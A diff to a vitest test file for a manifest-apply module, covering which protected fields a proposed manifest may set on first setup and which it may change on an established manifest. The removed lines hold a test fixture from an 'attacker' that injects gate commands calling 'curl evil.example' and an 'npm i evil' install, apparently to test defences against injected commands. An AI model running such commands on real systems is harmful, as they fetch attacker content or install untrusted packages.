@@ -1,7 +1,10 @@
 import { describe, it, expect } from 'vitest';
 import type { Manifest, RepositoryDef, ServiceDef } from '../manifest/types.js';
 import {
+  adoptedProtectedFields,
   applyManifestProposal,
+  droppedProtectedFields,
+  isScaffoldManifest,
   diffManifest,
   listStartCommands,
 } from './manifestApply.js';
@@ -29,31 +32,61 @@ function manifest(over: Partial<Manifest> & { repositories: Record<string, Repos
 }
 
 describe('applyManifestProposal', () => {
-  it('strips protected fields and fills required defaults when there is no current manifest', () => {
+  it('on first setup takes protected fields from the proposal but never the id', () => {
     const proposed = manifest({
       repositories: { web: repo('/w/web') },
       id: 'attacker',
       agentProvider: 'codex',
-      defaultModel: 'evil',
       processes: { review: { provider: 'claude', model: 'm' } },
-      uat: { gates: [{ name: 'evil', kind: 'command', command: 'curl evil.example' }] } as Manifest['uat'],
-      analysis: { codePointers: true },
-      review: { gates: [{ name: 'evil', kind: 'command', command: 'curl evil.example' }] } as Manifest['review'],
-      approaches: [{ id: 'a', label: 'a', source: { type: 'npm', package: 'evil', command: 'npm i evil', collect: [] } }],
     });
     const applied = applyManifestProposal(undefined, proposed);
     expect(applied.id).toBeUndefined();
-    expect(applied.agentProvider).toBeUndefined();
-    expect(applied.defaultModel).toBeUndefined();
-    expect(applied.processes).toBeUndefined();
-    expect(applied.uat).toBeUndefined();
-    expect(applied.analysis).toBeUndefined();
-    expect(applied.review).toBeUndefined();
-    expect(applied.approaches).toBeUndefined();
+    expect(applied.agentProvider).toBe('codex');
+    expect(applied.processes).toEqual(proposed.processes);
+    expect(droppedProtectedFields(undefined, proposed)).toEqual(['id']);
+  });
+
+  it('fills required defaults when a first-setup proposal omits them', () => {
+    const proposed = { repositories: { web: repo('/w/web') } } as unknown as Manifest;
+    const applied = applyManifestProposal(undefined, proposed);
     expect(applied.host).toBe('127.0.0.1');
     expect(applied.portRange).toEqual([4000, 4100]);
     expect(applied.baselineBranch).toBe('develop');
-    expect(Object.keys(applied.repositories)).toEqual(['web']);
+  });
+
+  it('keeps the scaffold id on first setup', () => {
+    const current = manifest({ repositories: {}, id: 'mine' });
+    const proposed = manifest({ repositories: { web: repo('/w/web') }, id: 'other', agentProvider: 'codex' });
+    const applied = applyManifestProposal(current, proposed, true);
+    expect(applied.id).toBe('mine');
+    expect(applied.agentProvider).toBe('codex');
+  });
+
+  it('names every protected field an established manifest drops', () => {
+    const current = manifest({ repositories: {}, id: 'k', agentProvider: 'codex', defaultModel: 'a' });
+    const proposed = manifest({
+      repositories: { web: repo('/w/web') },
+      id: 'k',
+      agentProvider: 'claude',
+      defaultModel: 'a',
+      baselineBranch: 'dev',
+    });
+    expect(droppedProtectedFields(current, proposed, false)).toEqual(['baselineBranch', 'agentProvider']);
+    expect(droppedProtectedFields(current, current, false)).toEqual([]);
+  });
+
+  it('detects an unedited scaffold by its protected fields, ignoring id and repositories', () => {
+    const template = manifest({ repositories: {}, id: 'scaffold', defaultModel: 'a' });
+    expect(isScaffoldManifest(manifest({ repositories: { web: repo('/w/web') }, id: 'mine', defaultModel: 'a' }), template)).toBe(true);
+    expect(isScaffoldManifest(manifest({ repositories: {}, defaultModel: 'edited' }), template)).toBe(false);
+    expect(isScaffoldManifest(manifest({ repositories: {}, defaultModel: 'a' }), undefined)).toBe(false);
+  });
+
+  it('lists adopted protected fields only on first setup', () => {
+    const proposed = manifest({ repositories: {}, id: 'x', agentProvider: 'codex' });
+    expect(adoptedProtectedFields(proposed, false)).toEqual([]);
+    expect(adoptedProtectedFields(proposed, true)).toEqual(expect.arrayContaining(['host', 'agentProvider']));
+    expect(adoptedProtectedFields(proposed, true)).not.toContain('id');
   });
 
   it('protects the analysis block from being dropped or flipped by a proposal', () => {
